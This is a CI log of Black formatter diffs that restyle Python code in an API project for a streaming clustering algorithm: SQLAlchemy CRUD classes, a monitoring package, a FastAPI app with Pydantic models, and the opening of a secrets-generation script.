+                    "silhouette_score": session.overall_silhouette_score,
+                    "cluster_purity": session.cluster_purity,
                 },
-                'errors': {
-                    'error_count': session.error_count,
-                    'warning_count': session.warning_count,
-                    'last_error': session.last_error_message
-                }
+                "errors": {
+                    "error_count": session.error_count,
+                    "warning_count": session.warning_count,
+                    "last_error": session.last_error_message,
+                },
             }
-            
+
             return summary
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error retrieving session summary: {e}")
+
 
 class MetricsCRUD(BaseCRUD):
     """CRUD operations for PerformanceMetric."""
-    
+
     def __init__(self):
         super().__init__(PerformanceMetric)
-        
+
     def record_metric(
         self,
         db: Session,
         session_id: uuid.UUID,
         metric_name: str,
         metric_category: str,
         value: Union[float, str, Dict[str, Any]],
-        **kwargs
+        **kwargs,
     ) -> PerformanceMetric:
         """Record a performance metric."""
         try:
             metric_data = {
-                'session_id': session_id,
-                'metric_name': metric_name,
-                'metric_category': metric_category,
-                **kwargs
+                "session_id": session_id,
+                "metric_name": metric_name,
+                "metric_category": metric_category,
+                **kwargs,
             }
-            
+
             # Set appropriate value field based on type
             if isinstance(value, (int, float, Decimal)):
-                metric_data['numeric_value'] = Decimal(str(value))
+                metric_data["numeric_value"] = Decimal(str(value))
             elif isinstance(value, str):
-                metric_data['string_value'] = value
+                metric_data["string_value"] = value
             elif isinstance(value, dict):
-                metric_data['json_value'] = value
+                metric_data["json_value"] = value
             else:
-                metric_data['string_value'] = str(value)
-                
+                metric_data["string_value"] = str(value)
+
             return self.create(db, obj_in=metric_data)
         except Exception as e:
             raise DatabaseException(f"Error recording metric: {e}")
-            
+
     def get_metrics_by_category(
         self,
         db: Session,
         session_id: uuid.UUID,
         category: str,
         *,
         start_time: Optional[datetime] = None,
-        end_time: Optional[datetime] = None
+        end_time: Optional[datetime] = None,
     ) -> List[PerformanceMetric]:
         """Get metrics by category with optional time filtering."""
         try:
             query = db.query(PerformanceMetric).filter(
                 and_(
                     PerformanceMetric.session_id == session_id,
-                    PerformanceMetric.metric_category == category
-                )
-            )
-            
+                    PerformanceMetric.metric_category == category,
+                )
+            )
+
             if start_time:
-                query = query.filter(PerformanceMetric.measurement_timestamp >= start_time)
+                query = query.filter(
+                    PerformanceMetric.measurement_timestamp >= start_time
+                )
             if end_time:
-                query = query.filter(PerformanceMetric.measurement_timestamp <= end_time)
-                
+                query = query.filter(
+                    PerformanceMetric.measurement_timestamp <= end_time
+                )
+
             return query.order_by(PerformanceMetric.measurement_timestamp).all()
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error retrieving metrics: {e}")
-            
+
     def get_metric_trends(
         self,
         db: Session,
         session_id: uuid.UUID,
         metric_name: str,
         *,
-        window_minutes: int = 60
+        window_minutes: int = 60,
     ) -> List[Dict[str, Any]]:
         """Get metric trends over time windows."""
         try:
             start_time = datetime.utcnow() - timedelta(minutes=window_minutes)
-            
-            metrics = db.query(PerformanceMetric).filter(
-                and_(
-                    PerformanceMetric.session_id == session_id,
-                    PerformanceMetric.metric_name == metric_name,
-                    PerformanceMetric.measurement_timestamp >= start_time,
-                    PerformanceMetric.numeric_value.isnot(None)
-                )
-            ).order_by(PerformanceMetric.measurement_timestamp).all()
-            
+
+            metrics = (
+                db.query(PerformanceMetric)
+                .filter(
+                    and_(
+                        PerformanceMetric.session_id == session_id,
+                        PerformanceMetric.metric_name == metric_name,
+                        PerformanceMetric.measurement_timestamp >= start_time,
+                        PerformanceMetric.numeric_value.isnot(None),
+                    )
+                )
+                .order_by(PerformanceMetric.measurement_timestamp)
+                .all()
+            )
+
             trends = []
             for metric in metrics:
-                trends.append({
-                    'timestamp': metric.measurement_timestamp.isoformat(),
-                    'value': float(metric.numeric_value),
-                    'window_seconds': metric.measurement_window_seconds,
-                    'sample_size': metric.sample_size
-                })
-                
+                trends.append(
+                    {
+                        "timestamp": metric.measurement_timestamp.isoformat(),
+                        "value": float(metric.numeric_value),
+                        "window_seconds": metric.measurement_window_seconds,
+                        "sample_size": metric.sample_size,
+                    }
+                )
+
             return trends
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error retrieving metric trends: {e}")
+
 
 class AuditCRUD(BaseCRUD):
     """CRUD operations for AuditLog."""
-    
+
     def __init__(self):
         super().__init__(AuditLog)
-        
+
     def log_event(
         self,
         db: Session,
         event_type: str,
         event_category: str,
@@ -606,209 +697,227 @@
         description: str,
         *,
         user_id: Optional[str] = None,
         resource_type: Optional[str] = None,
         resource_id: Optional[str] = None,
-        **kwargs
+        **kwargs,
     ) -> AuditLog:
         """Log an audit event."""
         try:
             log_data = {
-                'event_type': event_type,
-                'event_category': event_category,
-                'action': action,
-                'description': description,
-                'user_id': user_id,
-                'resource_type': resource_type,
-                'resource_id': resource_id,
-                **kwargs
+                "event_type": event_type,
+                "event_category": event_category,
+                "action": action,
+                "description": description,
+                "user_id": user_id,
+                "resource_type": resource_type,
+                "resource_id": resource_id,
+                **kwargs,
             }
-            
+
             return self.create(db, obj_in=log_data)
         except Exception as e:
             raise DatabaseException(f"Error logging audit event: {e}")
-            
+
     def get_security_events(
         self,
         db: Session,
         *,
-        security_level: str = 'warning',
+        security_level: str = "warning",
         hours: int = 24,
         skip: int = 0,
-        limit: int = 100
+        limit: int = 100,
     ) -> List[AuditLog]:
         """Get security-related audit events."""
         try:
             start_time = datetime.utcnow() - timedelta(hours=hours)
-            
+
             query = db.query(AuditLog).filter(
                 and_(
-                    AuditLog.security_level.in_(['warning', 'critical']),
-                    AuditLog.created_at >= start_time
-                )
-            )
-            
-            if security_level == 'critical':
-                query = query.filter(AuditLog.security_level == 'critical')
-                
-            return query.order_by(desc(AuditLog.created_at))\
-                       .offset(skip).limit(limit).all()
+                    AuditLog.security_level.in_(["warning", "critical"]),
+                    AuditLog.created_at >= start_time,
+                )
+            )
+
+            if security_level == "critical":
+                query = query.filter(AuditLog.security_level == "critical")
+
+            return (
+                query.order_by(desc(AuditLog.created_at))
+                .offset(skip)
+                .limit(limit)
+                .all()
+            )
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error retrieving security events: {e}")
+
 
 class UserCRUD(BaseCRUD):
     """CRUD operations for UserActivity."""
-    
+
     def __init__(self):
         super().__init__(UserActivity)
-        
+
     def record_activity(
         self,
         db: Session,
         user_id: str,
         activity_type: str,
         category: str,
         *,
         activity_name: Optional[str] = None,
-        **kwargs
+        **kwargs,
     ) -> UserActivity:
         """Record user activity."""
         try:
             activity_data = {
-                'user_id': user_id,
-                'activity_type': activity_type,
-                'category': category,
-                'activity_name': activity_name,
-                **kwargs
+                "user_id": user_id,
+                "activity_type": activity_type,
+                "category": category,
+                "activity_name": activity_name,
+                **kwargs,
             }
-            
+
             return self.create(db, obj_in=activity_data)
         except Exception as e:
             raise DatabaseException(f"Error recording user activity: {e}")
-            
+
     def get_user_analytics(
-        self,
-        db: Session,
-        user_id: str,
-        *,
-        days: int = 30
+        self, db: Session, user_id: str, *, days: int = 30
     ) -> Dict[str, Any]:
         """Get user activity analytics."""
         try:
             start_date = datetime.utcnow() - timedelta(days=days)
-            
-            stats = db.query(
-                func.count(UserActivity.id).label('total_activities'),
-                func.count(func.distinct(UserActivity.activity_type)).label('unique_activities'),
-                func.avg(UserActivity.duration_seconds).label('avg_duration'),
-                func.sum(UserActivity.data_processed_mb).label('total_data_mb'),
-                func.avg(UserActivity.success_rate).label('avg_success_rate')
-            ).filter(
-                and_(
-                    UserActivity.user_id == user_id,
-                    UserActivity.created_at >= start_date
-                )
-            ).first()
-            
+
+            stats = (
+                db.query(
+                    func.count(UserActivity.id).label("total_activities"),
+                    func.count(func.distinct(UserActivity.activity_type)).label(
+                        "unique_activities"
+                    ),
+                    func.avg(UserActivity.duration_seconds).label("avg_duration"),
+                    func.sum(UserActivity.data_processed_mb).label("total_data_mb"),
+                    func.avg(UserActivity.success_rate).label("avg_success_rate"),
+                )
+                .filter(
+                    and_(
+                        UserActivity.user_id == user_id,
+                        UserActivity.created_at >= start_date,
+                    )
+                )
+                .first()
+            )
+
             return {
-                'period_days': days,
-                'total_activities': stats.total_activities or 0,
-                'unique_activity_types': stats.unique_activities or 0,
-                'avg_session_duration_seconds': float(stats.avg_duration) if stats.avg_duration else 0,
-                'total_data_processed_mb': float(stats.total_data_mb) if stats.total_data_mb else 0,
-                'avg_success_rate': float(stats.avg_success_rate) if stats.avg_success_rate else 0
+                "period_days": days,
+                "total_activities": stats.total_activities or 0,
+                "unique_activity_types": stats.unique_activities or 0,
+                "avg_session_duration_seconds": float(stats.avg_duration)
+                if stats.avg_duration
+                else 0,
+                "total_data_processed_mb": float(stats.total_data_mb)
+                if stats.total_data_mb
+                else 0,
+                "avg_success_rate": float(stats.avg_success_rate)
+                if stats.avg_success_rate
+                else 0,
             }
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error retrieving user analytics: {e}")
+
 
 class ConfigCRUD(BaseCRUD):
     """CRUD operations for SystemConfiguration."""
-    
+
     def __init__(self):
         super().__init__(SystemConfiguration)
-        
+
     def get_config(
-        self,
-        db: Session,
-        config_key: str,
-        environment: str = 'production'
+        self, db: Session, config_key: str, environment: str = "production"
     ) -> Optional[SystemConfiguration]:
         """Get configuration by key and environment."""
         try:
-            return db.query(SystemConfiguration).filter(
-                and_(
-                    SystemConfiguration.config_key == config_key,
-                    SystemConfiguration.environment == environment,
-                    SystemConfiguration.is_active == True
-                )
-            ).first()
+            return (
+                db.query(SystemConfiguration)
+                .filter(
+                    and_(
+                        SystemConfiguration.config_key == config_key,
+                        SystemConfiguration.environment == environment,
+                        SystemConfiguration.is_active == True,
+                    )
+                )
+                .first()
+            )
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error retrieving configuration: {e}")
-            
+
     def set_config(
         self,
         db: Session,
         config_key: str,
         config_value: Any,
         *,
         config_category: str,
         data_type: str,
-        environment: str = 'production',
+        environment: str = "production",
         changed_by: Optional[str] = None,
-        **kwargs
+        **kwargs,
     ) -> SystemConfiguration:
         """Set or update configuration value."""
         try:
             # Get existing config if it exists
             existing = self.get_config(db, config_key, environment)
-            
+
             if existing:
                 # Update existing configuration
                 config_data = {
-                    'config_value': config_value,
-                    'version': existing.version + 1,
-                    'changed_by': changed_by,
-                    'previous_value': existing.config_value,
-                    **kwargs
+                    "config_value": config_value,
+                    "version": existing.version + 1,
+                    "changed_by": changed_by,
+                    "previous_value": existing.config_value,
+                    **kwargs,
                 }
                 return self.update(db, db_obj=existing, obj_in=config_data)
             else:
                 # Create new configuration
                 config_data = {
-                    'config_key': config_key,
-                    'config_value': config_value,
-                    'config_category': config_category,
-                    'data_type': data_type,
-                    'environment': environment,
-                    'changed_by': changed_by,
-                    **kwargs
+                    "config_key": config_key,
+                    "config_value": config_value,
+                    "config_category": config_category,
+                    "data_type": data_type,
+                    "environment": environment,
+                    "changed_by": changed_by,
+                    **kwargs,
                 }
                 return self.create(db, obj_in=config_data)
         except Exception as e:
             raise DatabaseException(f"Error setting configuration: {e}")
-            
+
     def get_category_configs(
-        self,
-        db: Session,
-        category: str,
-        environment: str = 'production'
+        self, db: Session, category: str, environment: str = "production"
     ) -> List[SystemConfiguration]:
         """Get all configurations in a category."""
         try:
-            return db.query(SystemConfiguration).filter(
-                and_(
-                    SystemConfiguration.config_category == category,
-                    SystemConfiguration.environment == environment,
-                    SystemConfiguration.is_active == True
-                )
-            ).order_by(SystemConfiguration.config_key).all()
+            return (
+                db.query(SystemConfiguration)
+                .filter(
+                    and_(
+                        SystemConfiguration.config_category == category,
+                        SystemConfiguration.environment == environment,
+                        SystemConfiguration.is_active == True,
+                    )
+                )
+                .order_by(SystemConfiguration.config_key)
+                .all()
+            )
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error retrieving category configs: {e}")
+
 
 # Initialize CRUD instances
 data_point_crud = DataPointCRUD()
 cluster_crud = ClusterCRUD()
 session_crud = SessionCRUD()
 metrics_crud = MetricsCRUD()
 audit_crud = AuditCRUD()
 user_crud = UserCRUD()
-config_crud = ConfigCRUD()
\ No newline at end of file
+config_crud = ConfigCRUD()
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/monitoring/__init__.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/monitoring/__init__.py	2025-06-10 20:31:25.481857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/monitoring/__init__.py	2025-06-10 20:32:34.014013+00:00
@@ -12,128 +12,128 @@
 from .metrics import (
     MetricsCollector,
     PrometheusMetrics,
     CustomMetrics,
     PerformanceTracker,
-    get_metrics_collector
+    get_metrics_collector,
 )
 
 from .logging import (
     setup_logging,
     get_logger,
     LoggingMiddleware,
     CorrelationIdFilter,
     StructuredLogger,
     audit_logger,
     performance_logger,
-    security_logger
+    security_logger,
 )
 
 from .health import (
     HealthChecker,
     ComponentHealthCheck,
     SystemHealthMonitor,
     get_health_checker,
-    health_check_registry
+    health_check_registry,
 )
 
 from .alerts import (
     AlertManager,
     AlertRule,
     NotificationChannel,
     EmailNotifier,
     SlackNotifier,
     WebhookNotifier,
-    get_alert_manager
+    get_alert_manager,
 )
 
 from .dashboard import (
     DashboardDataAggregator,
     MetricsDashboard,
     RealtimeMonitor,
     SessionAnalytics,
-    get_dashboard_data
+    get_dashboard_data,
 )
 
 __all__ = [
     # Metrics
     "MetricsCollector",
-    "PrometheusMetrics", 
+    "PrometheusMetrics",
     "CustomMetrics",
     "PerformanceTracker",
     "get_metrics_collector",
-    
     # Logging
     "setup_logging",
     "get_logger",
     "LoggingMiddleware",
-    "CorrelationIdFilter", 
+    "CorrelationIdFilter",
     "StructuredLogger",
     "audit_logger",
     "performance_logger",
     "security_logger",
-    
     # Health Checks
     "HealthChecker",
     "ComponentHealthCheck",
-    "SystemHealthMonitor", 
+    "SystemHealthMonitor",
     "get_health_checker",
     "health_check_registry",
-    
     # Alerts
     "AlertManager",
     "AlertRule",
     "NotificationChannel",
     "EmailNotifier",
-    "SlackNotifier", 
+    "SlackNotifier",
     "WebhookNotifier",
     "get_alert_manager",
-    
     # Dashboard
     "DashboardDataAggregator",
     "MetricsDashboard",
     "RealtimeMonitor",
-    "SessionAnalytics", 
-    "get_dashboard_data"
+    "SessionAnalytics",
+    "get_dashboard_data",
 ]
 
 # Package metadata
 __version__ = "1.0.0"
 __author__ = "NCS Development Team"
-__description__ = "Comprehensive monitoring and observability for NeuroCluster Streamer API"
+__description__ = (
+    "Comprehensive monitoring and observability for NeuroCluster Streamer API"
+)
 
 # Initialize global monitoring components
 _metrics_collector = None
 _health_checker = None
 _alert_manager = None
 
+
 def initialize_monitoring(config: dict = None):
     """
     Initialize all monitoring components with configuration.
-    
+
     Args:
         config: Optional configuration dictionary
     """
     global _metrics_collector, _health_checker, _alert_manager
-    
+
     # Initialize metrics collection
     _metrics_collector = MetricsCollector(config)
-    
+
     # Initialize health checking
     _health_checker = HealthChecker(config)
-    
+
     # Initialize alerting
     _alert_manager = AlertManager(config)
-    
+
     # Setup logging
     setup_logging(config)
+
 
 def shutdown_monitoring():
     """Gracefully shutdown all monitoring components."""
     global _metrics_collector, _health_checker, _alert_manager
-    
+
     if _metrics_collector:
         _metrics_collector.shutdown()
     if _health_checker:
         _health_checker.shutdown()
     if _alert_manager:
-        _alert_manager.shutdown()
\ No newline at end of file
+        _alert_manager.shutdown()
--- /home/runner/work/NCS-API-Project/NCS-API-Project/main.secure.py	2025-06-10 20:31:25.481857+00:00
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/main.secure.py
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/main.secure.py	2025-06-10 20:32:34.118403+00:00
@@ -25,139 +25,161 @@
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+
 # Pydantic Models for API
 class DataPoint(BaseModel):
     """Single data point for clustering"""
+
     coordinates: List[float] = Field(..., min_items=1, max_items=1000)
     metadata: Optional[Dict[str, Any]] = Field(default=None)
 
+
 class ProcessPointRequest(BaseModel):
     """Request for processing single data point"""
+
     point: DataPoint
-    
-    @validator('point')
+
+    @validator("point")
     def validate_point_dimensions(cls, v):
         if len(v.coordinates) == 0:
             raise ValueError("Point must have at least one dimension")
         if len(v.coordinates) > 1000:
             raise ValueError("Point cannot have more than 1000 dimensions")
         return v
 
+
 class ProcessBatchRequest(BaseModel):
     """Request for processing multiple data points"""
+
     points: List[DataPoint] = Field(..., min_items=1, max_items=1000)
-    
-    @validator('points')
+
+    @validator("points")
     def validate_batch_size(cls, v):
         if len(v) > 1000:
             raise ValueError("Batch size cannot exceed 1000 points")
         return v
 
+
 class ClusterResult(BaseModel):
     """Result for a clustered point"""
+
     point_index: int
     cluster_id: int
     outlier_score: float
     processing_time_ms: float
 
+
 class OutlierResult(BaseModel):
     """Result for an outlier point"""
+
     point_index: int
     outlier_score: float
     reason: str
 
+
 class ProcessingResponse(BaseModel):
     """Response from processing operation"""
+
     request_id: str
     clusters: List[ClusterResult]
     outliers: List[OutlierResult]
     summary: Dict[str, Any]
     total_processing_time_ms: float
 
+
 class ClusterSummary(BaseModel):
     """Summary of current clusters"""
+
     cluster_id: int
     centroid: List[float]
     confidence: float
     points_count: int
     stability: float
     age: float
 
+
 class AlgorithmStats(BaseModel):
     """Algorithm performance statistics"""
+
     total_points_processed: int
     clusters_found: int
     outliers_detected: int
     avg_processing_time_ms: float
     clustering_quality: float
     global_stability: float
     memory_usage_mb: float
     uptime_seconds: float
 
+
 class HealthCheck(BaseModel):
     """Health check response"""
+
     status: str
     timestamp: float
     uptime_seconds: float
     algorithm_ready: bool
     version: str
+
 
 # Global state
 class APIState:
     def __init__(self):
         self.ncs_instance: Optional[NeuroClusterStreamer] = None
         self.is_ready = False
         self.startup_time = None
         self.request_count = 0
 
+
 api_state = APIState()
+
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     """Application lifespan management"""
     # Startup
     logger.info("🚀 Starting NeuroCluster Streamer API...")
     api_state.startup_time = time.time()
-    
+
     try:
         # Initialize the NCS algorithm
         api_state.ncs_instance = NeuroClusterStreamer(
-            base_threshold=0.71,
-            learning_rate=0.06,
-            performance_mode=True
+            base_threshold=0.71, learning_rate=0.06, performance_mode=True
         )
         api_state.is_ready = True
         logger.info("✅ NCS algorithm initialized successfully")
         logger.info(f"📊 Expected performance: ~6,300 points/second")
-        
+
     except Exception as e:
         logger.error(f"❌ Failed to initialize NCS algorithm: {e}")
         api_state.is_ready = False
-    
+
     yield
-    
+
     # Shutdown
     logger.info("🛑 Shutting down NeuroCluster Streamer API...")
     if api_state.ncs_instance:
         logger.info("📊 Final algorithm statistics:")
         try:
             stats = api_state.ncs_instance.get_statistics()
-            logger.info(f"   Total points processed: {stats.get('total_points_processed', 0)}")
+            logger.info(
+                f"   Total points processed: {stats.get('total_points_processed', 0)}"
+            )
             logger.info(f"   Clusters found: {stats.get('num_clusters', 0)}")
             logger.info(f"   Average quality: {stats.get('clustering_quality', 0):.3f}")
         except Exception as e:
             logger.warning(f"Could not retrieve final stats: {e}")
+
 
 # Create FastAPI app
 app = FastAPI(
     title="NeuroCluster Streamer API",
     description="High-performance streaming clustering with adaptive intelligence",
     version="1.0.0",
-    lifespan=lifespan
+    lifespan=lifespan,
 )
 
 # Add middleware
 app.add_middleware(GZipMiddleware, minimum_size=1000)
 app.add_middleware(
@@ -166,223 +188,244 @@
     allow_credentials=True,
     allow_methods=["GET", "POST", "PUT", "DELETE"],
     allow_headers=["*"],
 )
 
+
 # Dependency for getting algorithm instance
 def get_ncs_algorithm() -> NeuroClusterStreamer:
     if not api_state.is_ready or api_state.ncs_instance is None:
         raise HTTPException(
-            status_code=503, 
-            detail="NCS algorithm not ready. Please try again later."
+            status_code=503, detail="NCS algorithm not ready. Please try again later."
         )
     return api_state.ncs_instance
+
 
 # API Endpoints
 @app.get("/health", response_model=HealthCheck)
 async def health_check():
     """Health check endpoint"""
     uptime = time.time() - api_state.startup_time if api_state.startup_time else 0
-    
+
     return HealthCheck(
         status="healthy" if api_state.is_ready else "starting",
         timestamp=time.time(),
         uptime_seconds=uptime,
         algorithm_ready=api_state.is_ready,
-        version="1.0.0"
+        version="1.0.0",
     )
+
 
 @app.post("/api/v1/process", response_model=ProcessingResponse)
 async def process_point(
     request: ProcessPointRequest,
     algorithm: NeuroClusterStreamer = Depends(get_ncs_algorithm),
-    current_user: User = Depends(get_current_user)
+    current_user: User = Depends(get_current_user),
 ):
     """Process a single data point"""
     request_id = str(uuid.uuid4())
     api_state.request_count += 1
-    
+
     start_time = time.time()
-    
+
     try:
         # Convert point to numpy array
         point_array = np.array(request.point.coordinates, dtype=np.float32)
-        
+
         # Process through NCS algorithm
         processing_start = time.time()
-        cluster_id, is_outlier, outlier_score = algorithm.process_data_point(point_array)
+        cluster_id, is_outlier, outlier_score = algorithm.process_data_point(
+            point_array
+        )
         processing_time = (time.time() - processing_start) * 1000
-        
+
         # Prepare response
         clusters = []
         outliers = []
-        
+
         if is_outlier:
-            outliers.append(OutlierResult(
-                point_index=0,
-                outlier_score=outlier_score,
-                reason="Multi-layer outlier detection"
-            ))
+            outliers.append(
+                OutlierResult(
+                    point_index=0,
+                    outlier_score=outlier_score,
+                    reason="Multi-layer outlier detection",
+                )
+            )
         else:
-            clusters.append(ClusterResult(
-                point_index=0,
-                cluster_id=cluster_id,
-                outlier_score=outlier_score,
-                processing_time_ms=processing_time
-            ))
-        
+            clusters.append(
+                ClusterResult(
+                    point_index=0,
+                    cluster_id=cluster_id,
+                    outlier_score=outlier_score,
+                    processing_time_ms=processing_time,
+                )
+            )
+
         # Get algorithm stats for summary
         stats = algorithm.get_statistics()
-        
+
         total_time = (time.time() - start_time) * 1000
-        
+
         return ProcessingResponse(
             request_id=request_id,
             clusters=clusters,
             outliers=outliers,
             summary={
-                "algorithm_quality": stats.get('clustering_quality', 0.0),
-                "current_clusters": stats.get('num_clusters', 0),
-                "total_processed": stats.get('total_points_processed', 0),
-                "stability": stats.get('global_stability', 0.0)
+                "algorithm_quality": stats.get("clustering_quality", 0.0),
+                "current_clusters": stats.get("num_clusters", 0),
+                "total_processed": stats.get("total_points_processed", 0),
+                "stability": stats.get("global_stability", 0.0),
             },
-            total_processing_time_ms=total_time
-        )
-        
+            total_processing_time_ms=total_time,
+        )
+
     except ValueError as e:
         raise HTTPException(status_code=400, detail=f"Invalid input: {str(e)}")
     except Exception as e:
         logger.error(f"Processing failed: {e}")
         raise HTTPException(status_code=500, detail="Internal processing error")
+
 
 @app.post("/api/v1/batch", response_model=ProcessingResponse)
 async def process_batch(
     request: ProcessBatchRequest,
     algorithm: NeuroClusterStreamer = Depends(get_ncs_algorithm),
-    current_user: User = Depends(get_current_user)
+    current_user: User = Depends(get_current_user),
 ):
     """Process multiple data points in batch"""
     request_id = str(uuid.uuid4())
     api_state.request_count += 1
-    
+
     start_time = time.time()
-    
+
     try:
         clusters = []
         outliers = []
-        
+
         # Process each point
         for i, point_data in enumerate(request.points):
             point_array = np.array(point_data.coordinates, dtype=np.float32)
-            
+
             processing_start = time.time()
-            cluster_id, is_outlier, outlier_score = algorithm.process_data_point(point_array)
+            cluster_id, is_outlier, outlier_score = algorithm.process_data_point(
+                point_array
+            )
             processing_time = (time.time() - processing_start) * 1000
-            
+
             if is_outlier:
-                outliers.append(OutlierResult(
-                    point_index=i,
-                    outlier_score=outlier_score,
-                    reason="Multi-layer outlier detection"
-                ))
+                outliers.append(
+                    OutlierResult(
+                        point_index=i,
+                        outlier_score=outlier_score,
+                        reason="Multi-layer outlier detection",
+                    )
+                )
             else:
-                clusters.append(ClusterResult(
-                    point_index=i,
-                    cluster_id=cluster_id,
-                    outlier_score=outlier_score,
-                    processing_time_ms=processing_time
-                ))
-        
+                clusters.append(
+                    ClusterResult(
+                        point_index=i,
+                        cluster_id=cluster_id,
+                        outlier_score=outlier_score,
+                        processing_time_ms=processing_time,
+                    )
+                )
+
         # Get algorithm stats
         stats = algorithm.get_statistics()
         total_time = (time.time() - start_time) * 1000
-        
+
         return ProcessingResponse(
             request_id=request_id,
             clusters=clusters,
             outliers=outliers,
             summary={
-                "algorithm_quality": stats.get('clustering_quality', 0.0),
-                "current_clusters": stats.get('num_clusters', 0),
-                "total_processed": stats.get('total_points_processed', 0),
-                "stability": stats.get('global_stability', 0.0),
+                "algorithm_quality": stats.get("clustering_quality", 0.0),
+                "current_clusters": stats.get("num_clusters", 0),
+                "total_processed": stats.get("total_points_processed", 0),
+                "stability": stats.get("global_stability", 0.0),
                 "batch_size": len(request.points),
-                "avg_processing_time_ms": total_time / len(request.points)
+                "avg_processing_time_ms": total_time / len(request.points),
             },
-            total_processing_time_ms=total_time
-        )
-        
+            total_processing_time_ms=total_time,
+        )
+
     except ValueError as e:
         raise HTTPException(status_code=400, detail=f"Invalid input: {str(e)}")
     except Exception as e:
         logger.error(f"Batch processing failed: {e}")
         raise HTTPException(status_code=500, detail="Internal processing error")
+
 
 @app.get("/api/v1/clusters", response_model=List[ClusterSummary])
 async def get_clusters(
     algorithm: NeuroClusterStreamer = Depends(get_ncs_algorithm),
-    current_user: User = Depends(get_current_user)
+    current_user: User = Depends(get_current_user),
 ):
     """Get current cluster information"""
     try:
         clusters_info = algorithm.get_clusters()
-        
+
         result = []
         for i, (centroid, stability, age, updates, quality) in enumerate(clusters_info):
-            result.append(ClusterSummary(
-                cluster_id=i,
-                centroid=centroid.tolist(),
-                confidence=quality,
-                points_count=updates,
-                stability=stability,
-                age=age
-            ))
-        
+            result.append(
+                ClusterSummary(
+                    cluster_id=i,
+                    centroid=centroid.tolist(),
+                    confidence=quality,
+                    points_count=updates,
+                    stability=stability,
+                    age=age,
+                )
+            )
+
         return result
-        
+
     except Exception as e:
         logger.error(f"Failed to get clusters: {e}")
         raise HTTPException(status_code=500, detail="Failed to retrieve clusters")
+
 
 @app.get("/api/v1/statistics", response_model=AlgorithmStats)
 async def get_algorithm_statistics(
     algorithm: NeuroClusterStreamer = Depends(get_ncs_algorithm),
-    current_user: User = Depends(get_current_user)
+    current_user: User = Depends(get_current_user),
 ):
     """Get algorithm performance statistics"""
     try:
         stats = algorithm.get_statistics()
         uptime = time.time() - api_state.startup_time if api_state.startup_time else 0
-        
+
         return AlgorithmStats(
-            total_points_processed=stats.get('total_points_processed', 0),
-            clusters_found=stats.get('num_clusters', 0),
-            outliers_detected=stats.get('outliers_detected', 0),
-            avg_processing_time_ms=stats.get('avg_processing_time_ms', 0.0),
-            clustering_quality=stats.get('clustering_quality', 0.0),
-            global_stability=stats.get('global_stability', 0.0),
-            memory_usage_mb=stats.get('memory_usage_estimate_mb', 0.0),
-            uptime_seconds=uptime
-        )
-        
+            total_points_processed=stats.get("total_points_processed", 0),
+            clusters_found=stats.get("num_clusters", 0),
+            outliers_detected=stats.get("outliers_detected", 0),
+            avg_processing_time_ms=stats.get("avg_processing_time_ms", 0.0),
+            clustering_quality=stats.get("clustering_quality", 0.0),
+            global_stability=stats.get("global_stability", 0.0),
+            memory_usage_mb=stats.get("memory_usage_estimate_mb", 0.0),
+            uptime_seconds=uptime,
+        )
+
     except Exception as e:
         logger.error(f"Failed to get statistics: {e}")
         raise HTTPException(status_code=500, detail="Failed to retrieve statistics")
+
 
 @app.post("/api/v1/reset")
 async def reset_algorithm(
     algorithm: NeuroClusterStreamer = Depends(get_ncs_algorithm),
-    current_user: User = Depends(get_current_user)
+    current_user: User = Depends(get_current_user),
 ):
     """Reset the algorithm state"""
     try:
         # This would need to be implemented in your NCS class
         # algorithm.reset()
         return {"message": "Algorithm reset successfully", "timestamp": time.time()}
     except Exception as e:
         logger.error(f"Failed to reset algorithm: {e}")
         raise HTTPException(status_code=500, detail="Failed to reset algorithm")
+
 
 @app.get("/")
 async def root():
     """Root endpoint with API information"""
     return {
@@ -390,25 +433,26 @@
         "version": "1.0.0",
         "description": "High-performance streaming clustering with adaptive intelligence",
         "performance": {
             "expected_throughput": "6,300+ points/second",
             "latency": "< 0.2ms per point",
-            "quality_score": "0.918"
+            "quality_score": "0.918",
         },
         "endpoints": {
             "health": "/health",
             "documentation": "/docs",
             "process_single": "/api/v1/process",
             "process_batch": "/api/v1/batch",
-            "get_clusters": "/api/v1/clusters", 
-            "get_statistics": "/api/v1/statistics"
-        }
+            "get_clusters": "/api/v1/clusters",
+            "get_statistics": "/api/v1/statistics",
+        },
     }
+
 
 if __name__ == "__main__":
     uvicorn.run(
         "main_secure:app",
         host="0.0.0.0",
         port=8000,
         reload=True,  # Enable for development
-        log_level="info"
-    )
\ No newline at end of file
+        log_level="info",
+    )
--- /home/runner/work/NCS-API-Project/NCS-API-Project/scripts/generate_secrets.py	2025-06-10 20:31:25.483857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/scripts/generate_secrets.py	2025-06-10 20:32:34.575590+00:00
@@ -45,389 +45,412 @@
 from pathlib import Path
 from cryptography import x509
 from cryptography.x509.oid import NameOID
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption
+from cryptography.hazmat.primitives.serialization import (
+    Encoding,
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/scripts/generate_secrets.py
+    PrivateFormat,
+    NoEncryption,
+)
+
 
 # Color constants for output
 class Colors:
-    RED = '\033[0;31m'
-    GREEN = '\033[0;32m'
-    YELLOW = '\033[1;33m'
-    BLUE = '\033[0;34m'
-    PURPLE = '\033[0;35m'
-    CYAN = '\033[0;36m'
-    NC = '\033[0m'  # No Color
+    RED = "\033[0;31m"
+    GREEN = "\033[0;32m"
+    YELLOW = "\033[1;33m"
+    BLUE = "\033[0;34m"
+    PURPLE = "\033[0;35m"
+    CYAN = "\033[0;36m"
+    NC = "\033[0m"  # No Color
+
 
